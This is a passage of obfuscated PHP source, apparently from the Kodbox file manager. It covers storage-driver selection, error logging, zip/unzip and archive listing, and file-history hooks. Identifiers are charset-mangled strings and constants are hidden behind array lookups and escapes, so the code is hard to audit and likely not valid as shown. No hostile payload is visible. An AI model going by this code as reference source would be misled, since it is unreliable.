$¬ç≤–¥·->fileSubstr($»ŸÀƒ≈Ò, $ú—–Ωäï, $ßŸª˛“ê); if (!$˛ç“Ôïô && $ßŸª˛“ê && isset($GLOBALS[$”€ãôû÷[1170]])) { throw new Exception($GLOBALS[$”€ãôû÷[1170]][$”€ãôû÷[1171]]); } return $˛ç“Ôïô; } private static function driverMake(&$«ô¡™¶∫) { $ö§√üÂ˛ =& $_SERVER[Á≈ ä ∞]; $Ü∂∑ﬁøË = KodIO::parse($«ô¡™¶∫); if (!self::$driverListSystem) { $©Ìá◊›‹ = Model($ö§√üÂ˛[774])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($©Ìá◊›‹, $ö§√üÂ˛[408]); } if ($Ü∂∑ﬁøË[$ö§√üÂ˛[43]] == KodIO::KOD_IO && !self::$driverListSystem[$Ü∂∑ﬁøË[$ö§√üÂ˛[408]]]) { return !1; } $«ô¡™¶∫ = $Ü∂∑ﬁøË[$ö§√üÂ˛[1172]]; $Ûê»±â‹ = self::driverGet($Ü∂∑ﬁøË, $«ô¡™¶∫); return $Ûê»±â‹; } private static function driverGet($ú√˜Ò∏⁄, &$é‰ï‚¨ç) { $¸Æ˙»‘‰ =& $_SERVER[Á≈ ä ∞]; $Ã©∏›•´ = $ú√˜Ò∏⁄[$¸Æ˙»‘‰[1173]]; $É‰©áê◊ = $ú√˜Ò∏⁄[$¸Æ˙»‘‰[408]]; switch ($ú√˜Ò∏⁄[$¸Æ˙»‘‰[43]]) { case KodIO::KOD_IO: $Â∏ù…ª« = self::$driverListSystem[$É‰©áê◊]; break; case KodIO::KOD_SOURCE: $é‰ï‚¨ç = $É‰©áê◊ . $é‰ï‚¨ç; $Â∏ù…ª« = array($¸Æ˙»‘‰[1174] => $¸Æ˙»‘‰[1175], $¸Æ˙»‘‰[16] => $ú√˜Ò∏⁄); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¯Üµ´Ë≠ = $GLOBALS[$¸Æ˙»‘‰[1176]]; self::$driverListUser = array_to_keyvalue($¯Üµ´Ë≠, $¸Æ˙»‘‰[408]); } $Â∏ù…ª« = self::$driverListUser[$É‰©áê◊]; break; case KodIO::KOD_SHARE_LINK: $Â∏ù…ª« = array($¸Æ˙»‘‰[1174] => $¸Æ˙»‘‰[1177], $¸Æ˙»‘‰[16] => $ú√˜Ò∏⁄); $ûäÑ‡“‘ = Action($¸Æ˙»‘‰[1178])->sharePathInfo($ú√˜Ò∏⁄[$¸Æ˙»‘‰[94]]); $é‰ï‚¨ç = $ûäÑ‡“‘[$¸Æ˙»‘‰[411]]; if (!$ûäÑ‡“‘[$¸Æ˙»‘‰[411]]) { $“⁄˙ã‡∏ = Model($¸Æ˙»‘‰[610])->getInfo($ûäÑ‡“‘[$¸Æ˙»‘‰[498]]); $é‰ï‚¨ç = KodIO::clear($“⁄˙ã‡∏[$¸Æ˙»‘‰[1179]] . $ú√˜Ò∏⁄[$¸Æ˙»‘‰[1172]]); $ú√˜Ò∏⁄[$¸Æ˙»‘‰[496]] = $“⁄˙ã‡∏; $ú√˜Ò∏⁄[$¸Æ˙»‘‰[1154]] = $é‰ï‚¨ç; $Â∏ù…ª« = array($¸Æ˙»‘‰[1174] => $¸Æ˙»‘‰[1180], $¸Æ˙»‘‰[16] => $ú√˜Ò∏⁄); } break; case KodIO::KOD_SHARE_ITEM: $Â∏ù…ª« = array($¸Æ˙»‘‰[1174] => $¸Æ˙»‘‰[1181], $¸Æ˙»‘‰[16] => $ú√˜Ò∏⁄); $“⁄˙ã‡∏ = Model($¸Æ˙»‘‰[610])->getInfo($ú√˜Ò∏⁄[$¸Æ˙»‘‰[408]]); if ($“⁄˙ã‡∏[$¸Æ˙»‘‰[411]] == $¸Æ˙»‘‰[207]) { $é‰ï‚¨ç = KodIO::clear($“⁄˙ã‡∏[$¸Æ˙»‘‰[1179]] . $ú√˜Ò∏⁄[$¸Æ˙»‘‰[1172]]); $ú√˜Ò∏⁄[$¸Æ˙»‘‰[496]] = $“⁄˙ã‡∏; $ú√˜Ò∏⁄[$¸Æ˙»‘‰[1154]] = $é‰ï‚¨ç; $Â∏ù…ª« = array($¸Æ˙»‘‰[1174] => $¸Æ˙»‘‰[1182], $¸Æ˙»‘‰[16] => $ú√˜Ò∏⁄); } else { if (!$é‰ï‚¨ç) { $é‰ï‚¨ç = $“⁄˙ã‡∏[$¸Æ˙»‘‰[411]]; } } break; default: $é‰ï‚¨ç = $ú√˜Ò∏⁄[$¸Æ˙»‘‰[94]]; $Â∏ù…ª« = array($¸Æ˙»‘‰[1174] => $¸Æ˙»‘‰[1183]); break; } $ÑÒ◊Â˛π = $ú√˜Ò∏⁄[$¸Æ˙»‘‰[94]]; if (!isset(self::$driverCache[$ÑÒ◊Â˛π])) { $Û˛è€¯Ã = strtolower($Â∏ù…ª«[$¸Æ˙»‘‰[105]]); $£÷ÕÙå´ = $GLOBALS[$¸Æ˙»‘‰[16]][$¸Æ˙»‘‰[99]][$¸Æ˙»‘‰[833]]; $ˆ‚è˛†ä = $¸Æ˙»‘‰[84] . (isset($£÷ÕÙå´[$Û˛è€¯Ã]) ? $£÷ÕÙå´[$Û˛è€¯Ã] : ucfirst($Û˛è€¯Ã)); if (!class_exists($ˆ‚è˛†ä)) { show_json("{$ˆ‚è˛†ä}\x20\156\157\164\x20\145\x78\151\163\164\163\41", !1); } $…Ë∫¬«¬ = isset($Â∏ù…ª«[$¸Æ˙»‘‰[16]]) ? $Â∏ù…ª«[$¸Æ˙»‘‰[16]] : !1; self::$driverCache[$ÑÒ◊Â˛π] = new $ˆ‚è˛†ä($…Ë∫¬«¬); } $¿»ÍïØ„ = self::$driverCache[$ÑÒ◊Â˛π]; $¿»ÍïØ„->pathDriver = $Ã©∏›•´; $¿»ÍïØ„->pathBase = $¸Æ˙»‘‰[22]; if (isset($Â∏ù…ª«[$¸Æ˙»‘‰[16]][$¸Æ˙»‘‰[1184]])) { $¿»ÍïØ„->pathBase = rtrim($Â∏ù…ª«[$¸Æ˙»‘‰[16]][$¸Æ˙»‘‰[1184]], $¸Æ˙»‘‰[18]) . $¸Æ˙»‘‰[18]; $é‰ï‚¨ç = $¿»ÍïØ„->pathBase . ltrim($é‰ï‚¨ç, $¸Æ˙»‘‰[18]); } $é‰ï‚¨ç = $¿»ÍïØ„->getPath($é‰ï‚¨ç); if (isset($ú√˜Ò∏⁄[$¸Æ˙»‘‰[1154]])) { $é‰ï‚¨ç = $ú√˜Ò∏⁄[$¸Æ˙»‘‰[1154]]; } $¿»ÍïØ„->path = $é‰ï‚¨ç; return $¿»ÍïØ„; } public static function errorTips($ı µ¯Á‚ = false) { $˜ôÚÉ⁄√ =& $_SERVER[Á≈ ä ∞]; static $„≤ßÚ§Ä = array(); $´˘¬éöƒ = 1000; if ($ı µ¯Á‚ === -1) { return $„≤ßÚ§Ä ? $„≤ßÚ§Ä[count($„≤ßÚ§Ä) - 1] : $˜ôÚÉ⁄√[22]; } if ($ı µ¯Á‚ === !1) { return implode($˜ôÚÉ⁄√[11], $„≤ßÚ§Ä); } if (count($„≤ßÚ§Ä) >= $´˘¬éöƒ) { $„≤ßÚ§Ä = array_slice($„≤ßÚ§Ä, $´˘¬éöƒ * 0.5, $´˘¬éöƒ); } $„≤ßÚ§Ä[] = $ı µ¯Á‚; write_log($˜ôÚÉ⁄√[172] . ACTION . $˜ôÚÉ⁄√[1185] . $ı µ¯Á‚, $˜ôÚÉ⁄√[1186]); } public static function getLastError($ƒÚäÊ¨ù = '') { $ŒÆıêæØ = self::errorTips(-1); return $ŒÆıêæØ ? $ŒÆıêæØ : $ƒÚäÊ¨ù; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $”û»ƒÊπ; if (!$”û»ƒÊπ) { $∏õ†úÍ≠ = IO::init($_SERVER[Á≈ ä ∞][18]); } return $∏õ†úÍ≠; } private static function iconvSystem($ÌÉ·∞›˛) { return self::local()->iconvSystem($ÌÉ·∞›˛); } private static function iconvApp($ÄÌ…Ê€ƒ) { return self::local()->iconvApp($ÄÌ…Ê€ƒ); } public static function zip($æ«Ëπ†Ÿ, $˛ê˜äΩñ = "\172\x69\160", $◊å¸ù≤Ó = '', $ªâñÃ€¶ = REPEAT_RENAME) { $§˛◊ÂŒ =& $_SERVER[Á≈ ä ∞]; $Œîı◊… = self::init($æ«Ëπ†Ÿ[0][$§˛◊ÂŒ[94]]); $Õ‡èÕ˜ = self::info($æ«Ëπ†Ÿ[0][$§˛◊ÂŒ[94]]); $ö˛„ü§¯ = !1; if (!$◊å¸ù≤Ó && $Œîı◊…->getType() == $§˛◊ÂŒ[116]) { $€≠ÒË˙≥ = self::zipFileList($æ«Ëπ†Ÿ); } else { $ö˛„ü§¯ = $◊å¸ù≤Ó ? $◊å¸ù≤Ó : TEMP_FILES . $§˛◊ÂŒ[1187] . time() . rand_string(8) . $§˛◊ÂŒ[18]; mk_dir($ö˛„ü§¯); $€≠ÒË˙≥ = self::zipFileList($æ«Ëπ†Ÿ, $ö˛„ü§¯); } $÷ïêé ª = $Õ‡èÕ˜[$§˛◊ÂŒ[42]]; if (count($€≠ÒË˙≥) > 1) { $¿‡ºÅ√é = IO::info(IO::pathFather($Õ‡èÕ˜[$§˛◊ÂŒ[94]])); $÷ïêé ª = $¿‡ºÅ√é[$§˛◊ÂŒ[42]]; } $Ãê»…◊ß = $ö˛„ü§¯; if (!$Ãê»…◊ß) { $Ãê»…◊ß = get_path_father($Õ‡èÕ˜[$§˛◊ÂŒ[94]]); if (!$◊å¸ù≤Ó && $Œîı◊…->getType() == $§˛◊ÂŒ[116]) { $Ãê»…◊ß = get_path_father($Œîı◊…->path); } $‰ÇÜùÉ‹ = IO::info($Ãê»…◊ß); if (!$‰ÇÜùÉ‹[$§˛◊ÂŒ[212]]) { show_json(LNG($§˛◊ÂŒ[1188]), !1); } } $≥û˙Ìƒ÷ = $Ãê»…◊ß . $÷ïêé ª . $§˛◊ÂŒ[20] . $˛ê˜äΩñ; $≥û˙Ìƒ÷ = get_filename_auto($≥û˙Ìƒ÷, $§˛◊ÂŒ[22], $ªâñÃ€¶); $√çÆº£ª = self::iconvSystem($≥û˙Ìƒ÷); foreach ($€≠ÒË˙≥ as $Ü ÷∂µ§ => $ô∏⁄√Ëô) { $€≠ÒË˙≥[$Ü ÷∂µ§] = self::iconvSystem($ô∏⁄√Ëô); } KodArchive::create($√çÆº£ª, $€≠ÒË˙≥); if (!IO::exist($≥û˙Ìƒ÷)) { if ($ö˛„ü§¯) { del_dir($ö˛„ü§¯); } show_json(LNG($§˛◊ÂŒ[1189]), !1); } if ($◊å¸ù≤Ó || !$ö˛„ü§¯) { if ($ö˛„ü§¯ && strstr($ö˛„ü§¯, TEMP_FILES)) { $˚‹ÇÀ÷™ = $€≠ÒË˙≥ = array(); recursion_dir($Ãê»…◊ß, $˚‹ÇÀ÷™, $€≠ÒË˙≥, 0); foreach ($˚‹ÇÀ÷™ as $∫¸’èΩÁ) { del_dir($∫¸’èΩÁ); } foreach ($€≠ÒË˙≥ as $Á¨ÙŒ‹˝) { if ($Á¨ÙŒ‹˝ == $√çÆº£ª) { continue; } del_file($Á¨ÙŒ‹˝); } } return $≥û˙Ìƒ÷; } $é≈µíõ– = self::pathFather($Õ‡èÕ˜[$§˛◊ÂŒ[94]]); $•›Ñµúò = self::move($≥û˙Ìƒ÷, $é≈µíõ–, $ªâñÃ€¶); if (!$•›Ñµúò) { del_dir($ö˛„ü§¯); show_json(LNG($§˛◊ÂŒ[1189]), !1); } del_dir($ö˛„ü§¯); return $•›Ñµúò; } public static function unzip($‰úêõÚó, $π∑›ñ˚ª = "\162\145\x70\x6c\141\143\x65") { $„Ã§éÓ• =& $_SERVER[Á≈ ä ∞]; $Ãœ˝àπÍ = $‰úêõÚó[$„Ã§éÓ•[94]]; $ï®ﬂ®∞Ç = $‰úêõÚó[$„Ã§éÓ•[1190]]; if (!($“É Ïˆˆ = parent::info($Ãœ˝àπÍ))) { show_json(LNG($„Ã§éÓ•[1191]), !1); } if (!($®∂óîí‹ = parent::infoFull($ï®ﬂ®∞Ç))) { $ï®ﬂ®∞Ç = parent::mkdir($ï®ﬂ®∞Ç); $®∂óîí‹ = array($„Ã§éÓ•[94] => $ï®ﬂ®∞Ç); } else { if (isset($®∂óîí‹[$„Ã§éÓ•[411]]) && trim($®∂óîí‹[$„Ã§éÓ•[94]], $„Ã§éÓ•[18]) != trim($ï®ﬂ®∞Ç, $„Ã§éÓ•[18])) { $µ¨˛áÄπ = KodIO::make($®∂óîí‹[$„Ã§éÓ•[441]]); $ü‚ÙÔª˜ = parent::fileNameAuto($µ¨˛áÄπ, $®∂óîí‹[$„Ã§éÓ•[42]], REPEAT_RENAME_FOLDER, !0); $ï®ﬂ®∞Ç = parent::mkdir($µ¨˛áÄπ . $ü‚ÙÔª˜); $®∂óîí‹ = array($„Ã§éÓ•[94] => $ï®ﬂ®∞Ç); } } $ï®ﬂ®∞Ç = $®∂óîí‹[$„Ã§éÓ•[94]]; $óãæˆ«Ó = self::tmpFileName($“É Ïˆˆ); $ñÀ•“±Ÿ = TEMP_FILES . $óãæˆ«Ó; del_dir($ñÀ•“±Ÿ); mk_dir($ñÀ•“±Ÿ); $’Ù®ò¢ = self::fileExt($“É Ïˆˆ); $Ì ⁄ö…ë = $ñÀ•“±Ÿ . $„Ã§éÓ•[20] . $’Ù®ò¢; if (!@file_exists(self::iconvSystem($Ì ⁄ö…ë))) { $«òõ—ı˛ = self::localFilePath($Ãœ˝àπÍ, $’Ù®ò¢); $Ì ⁄ö…ë = $«òõ—ı˛ ? $«òõ—ı˛ : parent::download($Ãœ˝àπÍ, $Ì ⁄ö…ë); } $Ì ⁄ö…ë = self::iconvSystem($Ì ⁄ö…ë); $ﬂ¬“Ù≥æ = isset($‰úêõÚó[$„Ã§éÓ•[1192]]) ? $‰úêõÚó[$„Ã§éÓ•[1192]] : $„Ã§éÓ•[1193]; $ı¢Üäö∏ = KodArchive::extract($Ì ⁄ö…ë, $ñÀ•“±Ÿ . $„Ã§éÓ•[18], $ﬂ¬“Ù≥æ); self::archiveExt(); if (!$ı¢Üäö∏[$„Ã§éÓ•[1194]]) { show_json($„Ã§éÓ•[1195] . $ı¢Üäö∏[$„Ã§éÓ•[1196]], !1); } Hook::trigger($„Ã§éÓ•[1197], $ñÀ•“±Ÿ); recursion_dir($ñÀ•“±Ÿ, $‚–ÀﬁÖ∆, $æöÕ¨È≈, 0); $Åä˙ã∞Ç = array_merge($‚–ÀﬁÖ∆, $æöÕ¨È≈); foreach ($Åä˙ã∞Ç as $¸«≠µ€Ü) { $¸«≠µ€Ü = self::iconvApp($¸«≠µ€Ü); self::move($¸«≠µ€Ü, $ï®ﬂ®∞Ç, $π∑›ñ˚ª); } del_dir($ñÀ•“±Ÿ); if (!$«òõ—ı˛) { del_file($Ì ⁄ö…ë); } return !0; } public static function unzipList($Ÿﬁ‘Òº÷) { $Î‚πˆŒ„ =& $_SERVER[Á≈ ä ∞]; $Á•Õº˝Ø = $Ÿﬁ‘Òº÷[$Î‚πˆŒ„[94]]; $ŸáÆÈîΩ = isset($Ÿﬁ‘Òº÷[$Î‚πˆŒ„[1198]]) ? $Ÿﬁ‘Òº÷[$Î‚πˆŒ„[1198]] : -1; $®¬›µøÿ = 50000; if (request_url_safe($Á•Õº˝Ø)) { $”ﬂÑ£¯á = parse_url_query($Á•Õº˝Ø); if (!isset($”ﬂÑ£¯á[$Î‚πˆŒ„[94]])) { show_json($Î‚πˆŒ„[1199], !1); } } $Óö¯Ë÷È = isset($”ﬂÑ£¯á) ? $”ﬂÑ£¯á[$Î‚πˆŒ„[94]] : $Á•Õº˝Ø; $Ôúµè∂ = self::info($Óö¯Ë÷È); $¥∞À†±∆ = self::fileExt($Ôúµè∂); $ìºƒÎ≈º = self::tmpFileName($Ôúµè∂); if (isset($”ﬂÑ£¯á)) { $Ÿûµ≠ﬁÒ = array($”ﬂÑ£¯á[$Î‚πˆŒ„[94]], $”ﬂÑ£¯á[$Î‚πˆŒ„[1198]], $”ﬂÑ£¯á[$Î‚πˆŒ„[42]]); $ÎﬁâÂ¸Ó = md5(implode($Î‚πˆŒ„[21], $Ÿûµ≠ﬁÒ)) . $Î‚πˆŒ„[20] . get_path_ext($”ﬂÑ£¯á[$Î‚πˆŒ„[42]]); } else { $Ÿûµ≠ﬁÒ = array($Ôúµè∂[$Î‚πˆŒ„[42]], $Ôúµè∂[$Î‚πˆŒ„[94]], $Ôúµè∂[$Î‚πˆŒ„[86]]); $ÎﬁâÂ¸Ó = md5(implode($Î‚πˆŒ„[21], $Ÿûµ≠ﬁÒ)) . $Î‚πˆŒ„[20] . $¥∞À†±∆; } if ($ŸáÆÈîΩ == -1) { $èõÅπ¡ı = IO_PATH_SYSTEM_TEMP . "\172\151\160\126\151\x65\167\x2f{$ìºƒÎ≈º}\57{$ÎﬁâÂ¸Ó}\x2e\x6c\x6f\x67"; $·íÕåÃì = self::infoFull($èõÅπ¡ı); if ($·íÕåÃì) { $èõÅπ¡ı = $·íÕåÃì[$Î‚πˆŒ„[94]]; $◊≥ØÀ‚± = self::getContent($èõÅπ¡ı); if ($◊≥ØÀ‚±) { $˘Ÿ˜£ˆ· = json_decode($◊≥ØÀ‚±, !0); $˘Ÿ˜£ˆ· = is_array($˘Ÿ˜£ˆ·) ? $˘Ÿ˜£ˆ· : array(); if (count($˘Ÿ˜£ˆ·) >= $®¬›µøÿ) { show_json(sprintf(LNG($Î‚πˆŒ„[1200]), count($˘Ÿ˜£ˆ·)), !1); } return $˘Ÿ˜£ˆ·; } } else { $èõÅπ¡ı = self::mkfile($èõÅπ¡ı); } } $œá∞ÿ∑ı = TEMP_FILES . $ìºƒÎ≈º; if (!is_dir($œá∞ÿ∑ı)) { mk_dir($œá∞ÿ∑ı); } $äÁ„àêπ = $œá∞ÿ∑ı . $Î‚πˆŒ„[18] . $ÎﬁâÂ¸Ó; if (!@file_exists(self::iconvSystem($äÁ„àêπ))) { if (isset($”ﬂÑ£¯á)) { url_request($Á•Õº˝Ø, $Î‚πˆŒ„[1201], $äÁ„àêπ); } else { $∫¬º∞£ﬂ = self::localFilePath($Á•Õº˝Ø, $¥∞À†±∆); $äÁ„àêπ = $∫¬º∞£ﬂ ? $∫¬º∞£ﬂ : self::download($Á•Õº˝Ø, $äÁ„àêπ); } } $äÁ„àêπ = self::iconvSystem($äÁ„àêπ); if ($ŸáÆÈîΩ >= 0) { $•ê™„Ù· = isset($Ÿﬁ‘Òº÷[$Î‚πˆŒ„[1202]]) ? $Ÿﬁ‘Òº÷[$Î‚πˆŒ„[1202]] : !1; $±ÿ¶Ô∆ø = isset($Ÿﬁ‘Òº÷[$Î‚πˆŒ„[42]]) ? $Ÿﬁ‘Òº÷[$Î‚πˆŒ„[42]] : $Î‚πˆŒ„[22]; KodArchive::filePreview($äÁ„àêπ, $ŸáÆÈîΩ, $•ê™„Ù·, $±ÿ¶Ô∆ø); self::archiveExt(); die; } $Í≥∏ù• = KodArchive::listContent($äÁ„àêπ); self::archiveExt(); del_dir($œá∞ÿ∑ı); if (!$Í≥∏ù•[$Î‚πˆŒ„[1194]]) { show_json($Í≥∏ù•[$Î‚πˆŒ„[1196]], !1); } $˘Ÿ˜£ˆ· = json_encode($Í≥∏ù•[$Î‚πˆŒ„[1196]]); self::setContent($èõÅπ¡ı, $˘Ÿ˜£ˆ·); if (count($Í≥∏ù•[$Î‚πˆŒ„[1196]]) >= $®¬›µøÿ) { show_json(sprintf(LNG($Î‚πˆŒ„[1200]), count($Í≥∏ù•[$Î‚πˆŒ„[1196]])), !1); } return $Í≥∏ù•[$Î‚πˆŒ„[1196]]; } private static function fileExt($ºô¥ƒÔ¯) { $Úò◊‰–– =& $_SERVER[Á≈ ä ∞]; $ÅÄ˝¥Âˆ = $ºô¥ƒÔ¯[$Úò◊‰––[184]]; if ($ÅÄ˝¥Âˆ == $Úò◊‰––[1203]) { $ÅÖΩ“î° = $Úò◊‰––[1204]; if (substr($ºô¥ƒÔ¯[$Úò◊‰––[42]], -strlen($ÅÖΩ“î°)) == $ÅÖΩ“î°) { $ÅÄ˝¥Âˆ = $Úò◊‰––[1205]; } } self::archiveExt($ÅÄ˝¥Âˆ); return $ÅÄ˝¥Âˆ; } private static function zipFileList($›ø£ãïæ, $∞œ«ñ«ã = false) { $˙Œ˜è·¶ =& $_SERVER[Á≈ ä ∞]; $—‘·£ÏÓ = array(); foreach ($›ø£ãïæ as $∑‘ª÷îµ) { $ª«œŒÙÚ = $∑‘ª÷îµ[$˙Œ˜è·¶[94]]; if ($∞œ«ñ«ã) { $ª«œŒÙÚ = self::copy($∑‘ª÷îµ[$˙Œ˜è·¶[94]], $∞œ«ñ«ã, $˙Œ˜è·¶[825]); } else { $§ÒÊπÃ¨ = self::init($∑‘ª÷îµ[$˙Œ˜è·¶[94]]); if ($§ÒÊπÃ¨->getType() == $˙Œ˜è·¶[116]) { $ª«œŒÙÚ = $§ÒÊπÃ¨->path; } } if ($ª«œŒÙÚ && self::local()->exist($ª«œŒÙÚ)) { $—‘·£ÏÓ[$∑‘ª÷îµ[$˙Œ˜è·¶[94]]] = $ª«œŒÙÚ; } } if (!empty($—‘·£ÏÓ)) { return array_values($—‘·£ÏÓ); } show_json(LNG($˙Œ˜è·¶[1169]), !1); } public static function tmpFileName($ÍÍö©˚ƒ) { $‘ƒÏ•À◊ =& $_SERVER[Á≈ ä ∞]; $™™∑›©° = array($ÍÍö©˚ƒ[$‘ƒÏ•À◊[42]], $ÍÍö©˚ƒ[$‘ƒÏ•À◊[94]], $ÍÍö©˚ƒ[$‘ƒÏ•À◊[86]], $ÍÍö©˚ƒ[$‘ƒÏ•À◊[530]]); return md5(implode($‘ƒÏ•À◊[21], $™™∑›©°)); } private static function localFilePath($¡îéß«©, $¿∞ÂË’Ì) { $íÆÙí¡ï =& $_SERVER[Á≈ ä ∞]; if ($¿∞ÂË’Ì == $íÆÙí¡ï[1206] && strtoupper(substr(PHP_OS, 0, 3)) == $íÆÙí¡ï[1207]) { return !1; } $ëòÅïÖ∞ = KodIO::parse($¡îéß«©); if ($ëòÅïÖ∞[$íÆÙí¡ï[43]] == KodIO::KOD_SOURCE) { $°Ä¬ˆÇå = Model($íÆÙí¡ï[832])->fileInfoGet(KodIO::sourceID($¡îéß«©)); if (!$°Ä¬ˆÇå[$íÆÙí¡ï[94]]) { show_json($íÆÙí¡ï[1208], !1); } $¡îéß«© = $°Ä¬ˆÇå[$íÆÙí¡ï[94]]; } $È«Ωä‚Ù = self::init($¡îéß«©); if ($È«Ωä‚Ù->pathParse[$íÆÙí¡ï[1154]]) { $¡îéß«© = $È«Ωä‚Ù->pathParse[$íÆÙí¡ï[1154]]; $È«Ωä‚Ù = self::init($¡îéß«©); } $∏ƒ††˚Ï = $È«Ωä‚Ù->getType(); if ($∏ƒ††˚Ï == $íÆÙí¡ï[116] || $∏ƒ††˚Ï == $íÆÙí¡ï[1209]) { if (!$È«Ωä‚Ù->exist($È«Ωä‚Ù->path)) { show_json(LNG($íÆÙí¡ï[115]), !1); } return $È«Ωä‚Ù->path; } return !1; } private static function archiveExt($’öÛ”§È = '') { $GLOBALS[$_SERVER[Á≈ ä ∞][1210]] = $’öÛ”§È; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $é∂‘ﬂºå =& $_SERVER[Á≈ ä ∞]; $ÿ˛€ÉÜ◊ = $GLOBALS[$é∂‘ﬂºå[16]][$é∂‘ﬂºå[99]]; if ($ÿ˛€ÉÜ◊[$é∂‘ﬂºå[1211]] != 1) { return; } if ($ÿ˛€ÉÜ◊[$é∂‘ﬂºå[1212]] <= 0) { return; } if (isset($_REQUEST[$é∂‘ﬂºå[1213]]) && $_REQUEST[$é∂‘ﬂºå[1213]] == $é∂‘ﬂºå[98]) { return; } Hook::bind($é∂‘ﬂºå[1214], $é∂‘ﬂºå[1215]); Hook::bind($é∂‘ﬂºå[1216], $é∂‘ﬂºå[1217]); Hook::bind($é∂‘ﬂºå[1218], $é∂‘ﬂºå[1219]); Hook::bind($é∂‘ﬂºå[1220], $é∂‘ﬂºå[1221]); Hook::bind($é∂‘ﬂºå[1222], $é∂‘ﬂºå[1223]); Hook::bind($é∂‘ﬂºå[1224], $é∂‘ﬂºå[1225]); } public static function eventBeforeUpload($èêõ€˜˛) { if ($èêõ€˜˛[3] && $èêõ€˜˛[3] != REPEAT_REPLACE) { return; } $†ƒ∑Ÿª˛ = self::parsePath($èêõ€˜˛[0]); if (!$†ƒ∑Ÿª˛) { return; } self::add($†ƒ∑Ÿª˛); } public static function eventBeforeEdit($ÃËéëÓ¥) { $üƒÕàÎÙ = self::parsePath($ÃËéëÓ¥[0]); if (!$üƒÕàÎÙ) { return; } self::add($üƒÕàÎÙ); } public static function eventBeforeCopyFile($†òâÚÊ , $ﬁ≈äÇåç, $ÃˆﬁÖ ™, $ﬁËÏ“ŒÍ, $ é–†≥î, $ø–ÿÌ˝ú) { $çô”¢ÈÉ =& $_SERVER[Á≈ ä ∞]; if (isset($ÃˆﬁÖ ™->_data[$çô”¢ÈÉ[1158]]) && $ÃˆﬁÖ ™->_data[$çô”¢ÈÉ[1158]]) { return; } $Ù·÷›Ü∑ = $ÃˆﬁÖ ™->getPathOuter($ﬁËÏ“ŒÍ); $Ëë∂ûÿ° = self::parsePath($Ù·÷›Ü∑); if (!$Ëë∂ûÿ°) { return; } self::add($Ëë∂ûÿ°); } public static function eventBeforeRename($¿äÒ´Ω∏) { $√€øÏÆú =& $_SERVER[Á≈ ä ∞]; $ªöÈ—¥ø = self::parsePath($¿äÒ´Ω∏[0]); if (!$ªöÈ—¥ø) { return; } $„øˆ¶…– = self::checkInHistory($ªöÈ—¥ø); if (!$„øˆ¶…–) { return; } if ($„øˆ¶…–[$√€øÏÆú[43]] == $√€øÏÆú[209]) { $ù˘”øÿÒ = self::listData($ªöÈ—¥ø); if ($ù˘”øÿÒ && $ù˘”øÿÒ[$√€øÏÆú[378]]) { self::moveHistory($ªöÈ—¥ø, $¿äÒ´Ω∏[1]); } } else { IO::rename($„øˆ¶…–[$√€øÏÆú[94]], $¿äÒ´Ω∏[1]); } } public static function eventBeforeMove($¬∫à‘À®) { $¯µﬂ¨èπ =& $_SERVER[Á≈ ä ∞]; $‘ÈÜˆ≥¢ = self::parsePath($¬∫à‘À®[0]); if (!$‘ÈÜˆ≥¢) { return; } $è˜â¿˚µ = self::parsePath($¬∫à‘À®[1]); if (!$è˜â¿˚µ) { return; } $ﬂô£¯¥˘ = $¬∫à‘À®[3]; $î«£î…â = self::checkInHistory($‘ÈÜˆ≥¢); if (!$î«£î…â) { return; } $ˆ∆Ï¿íú = self::pathHistory($è˜â¿˚µ); if ($î«£î…â[$¯µﬂ¨èπ[43]] == $¯µﬂ¨èπ[209]) { $Ø∫ú·∂è = self::listData($‘ÈÜˆ≥¢); $ûìÁì›© = rtrim($è˜â¿˚µ, $¯µﬂ¨èπ[18]) . $¯µﬂ¨èπ[18] . ($ﬂô£¯¥˘ ? $ﬂô£¯¥˘ : get_path_this($‘ÈÜˆ≥¢)); $∂”˙ÜÁ¯ = self::listData($ûìÁì›©); if ($Ø∫ú·∂è && $Ø∫ú·∂è[$¯µﬂ¨èπ[378]] && $∂”˙ÜÁ¯ && $∂”˙ÜÁ¯[$¯µﬂ¨èπ[378]]) { return self::clear($‘ÈÜˆ≥¢); } if ($Ø∫ú·∂è && $Ø∫ú·∂è[$¯µﬂ¨èπ[378]]) { self::moveHistory($‘ÈÜˆ≥¢, $ﬂô£¯¥˘, $ˆ∆Ï¿íú); } } else { IO::move($î«£î…â[$¯µﬂ¨èπ[94]], $ˆ∆Ï¿íú, !1, $ﬂô£¯¥˘); self::clearEmptyFolder(IO::pathFather($î«£î…â[$¯µﬂ¨èπ[94]])); } } public static function eventAfterRemove($Ö©ΩÛ∏Ú, $ùŸΩÖö) { $êÆ¸·Œ˛ =& $_SERVER[Á≈ ä ∞]; if (!$ùŸΩÖö) { return; } $¶≤ﬂï—Â = self::parsePath($Ö©ΩÛ∏Ú[0]); if (!$¶≤ﬂï—Â) { return; } $£∂Îò®£ = self::checkInHistory($¶≤ﬂï—Â); if (!$£∂Îò®£) { return; } if ($£∂Îò®£[$êÆ¸·Œ˛[43]] == $êÆ¸·Œ˛[209]) { $Ë¨Â˙ëƒ = self::listData($¶≤ﬂï—Â, !1); if ($Ë¨Â˙ëƒ && $Ë¨Â˙ëƒ[$êÆ¸·Œ˛[378]]) { self::clear($¶≤ﬂï—Â, !1); } } else { IO::remove($£∂Îò®£[$êÆ¸·Œ˛[94]]); self::clearEmptyFolder(IO::pathFather($£∂Îò®£[$êÆ¸·Œ˛[94]])); } } private static function checkInHistory($…ºá§¯œ) { $Ô®Ü°˝˛ = self::pathHistory($…ºá§¯œ); if (!IO::exist($Ô®Ü°˝˛)) { $Ô®Ü°˝˛ .= $_SERVER[Á≈ ä ∞][1226]; } return IO::exist($Ô®Ü°˝˛) ? IO::info($Ô®Ü°˝˛) : !1; } private static function parsePath($∆∞ÆΩÅ´) { $™óø⁄∫∫ =& $_SERVER[Á≈ ä ∞]; if (!$∆∞ÆΩÅ´) { return !1; } if ($GLOBALS[$™óø⁄∫∫[1227]]) { return; } $µ®Ã…™ﬂ = KodIO::parse($∆∞ÆΩÅ´); $ıÙïé®« = $µ®Ã…™ﬂ[$™óø⁄∫∫[43]]; $î›™≥«ﬁ = !$ıÙïé®« || $ıÙïé®« == KodIO::KOD_IO || $ıÙïé®« == KodIO::KOD_SHARE_ITEM; if (!$î›™≥«ﬁ || !$µ®Ã…™ﬂ[$™óø⁄∫∫[1228]]) { return !1; } if 